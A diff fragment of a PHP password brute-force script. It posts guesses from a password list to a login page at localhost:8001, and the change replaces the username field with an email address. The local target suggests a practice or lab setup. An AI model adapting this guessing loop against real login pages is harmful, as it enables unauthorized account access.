@@ -110,7 +110,7 @@ $passwords = [
 $index = 0;
 while (1) {
     $data= array(
-        'username' => 'user',
+        'email' => 'user@gmail.com',
         'password' => $passwords[$index],
     );
 
@@ -143,7 +143,7 @@ while (1) {
     if ($finalUrl == "http://localhost:8001/login.php") {
         echo 'try ' . $data["password"];
     } else {
-        echo 'usernmae: ' . $data["username"] . " password: " . $data["password"] . 'is valid';
+        echo 'email: ' . $data["email"] . " password: " . $data["password"];
 
         break;
     }
